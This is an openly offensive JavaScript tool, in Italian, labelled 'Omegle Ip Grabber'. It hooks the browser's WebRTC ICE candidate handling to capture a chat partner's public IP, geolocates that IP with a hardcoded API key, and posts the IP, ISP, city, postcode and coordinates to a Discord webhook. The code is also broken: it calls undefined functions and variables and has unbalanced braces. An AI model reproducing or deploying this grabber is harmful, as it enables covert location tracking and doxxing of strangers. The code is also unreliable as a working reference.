// Omegle Ip Grabber
// Changelogs: [+] Added Discord Webhook
// Soon: GUI
// Discord Webhook is frame limited

const geokey = "474becb7a864494b9236a0a359b4df5b";
const hook = "discord webhook"

function loadezomegle() {
  window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
  window.RTCPeerConnection = function (...args) {const pc = new window.oRTCPeerConnection(...args);
    pc.oaddIceCandidate = pc.addIceCandidate;
    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};

const geo = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
    await fetch(url).then((response) =>
        response.json().then((json) => {

            const output = `
                ---------------------------
                
                Stato: ${json.country_name}
                Provincia: ${json.state_prov}
                Città: ${json.city}
                Stretto: ${json.district}
                Lat / Long: (${json.latitude}, ${json.longitude})
                IP: ${json.ip}
                Operatore: ${json.isp}
                Codice Postale: ${json.zipcode}

                
                Da: ${json.city},
                
                Vedi sulla Mappa:  https://ipgeolocation.io/ip-location/${json.ip}
                
                ---------------------------
                `;
            console.log(output);
            
            const msg = {
                "content":`
                `,
                
                "embeds":
                [
                    {
                      "author": {
                        "name": "EZ omigol",
                        "url": "",
                        "icon_url": "https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png"
                      },
                      "title": "𝗡𝘂𝗼𝘃𝗼 𝗟𝗼𝗴 𝘀𝘂 𝗢𝗺𝗲𝗴𝗹𝗲",
                      "url": "https://dsc.gg/HealsNetwork",
                      "description": `*Da:* ${json.city}, ${json.state_prov}, ${json.country_name} [Vedi sulla Mappa](https://en.iponmap.com/${json.ip})`,
                      "color": "15258703",
                      "fields": [
                        {
                            "name": "IP:",
                            "value": `${json.ip}`,
                            "inline": true
                        },
                        {
                            "name": "Operatore:",
                            "value": `${json.isp}`,
                            "inline": true
                        },
                        {
                            "name": "Stato:",
                            "value": `${json.country_name}`,
                            "inline": true
                        },
                        {
                            "name": "Regione:",
                            "value": `${json.state_prov}`,
                            "inline": true
                        },
                        {
                            "name": "Provincia:",
                            "value": `${json.city}`,
                            "inline": true
                        },
                        {
                            "name": "Città:",
                            "value": `${json.district}`,
                        },
                        {
                            "name": "Codice Postale:",
                            "value": `${json.zipcode}`,
                            "inline": true
                        },
                        {
                            "name": "Longitudine:",
                            "value": `${json.longitude}`,
                        },
                        {
                            "name": "Latitudine:",
                            "value": `${json.latitude}`,
                        }
                      ],
                      "footer": {
                        "text": `Ora in ${json.state_prov}: ${json.time_zone.current_time}`,
                        "icon_url": `${json.country_flag}`
                      }
                    }
                ]
            }
            fetch(webhook + "?wait=true",
            {"method":"POST", 
            "headers": {"content-type": "application/json"},
            "body": JSON.stringify(msg)})
            .then(a=>a.json()).then(console.log)
          }
        })
    );
};
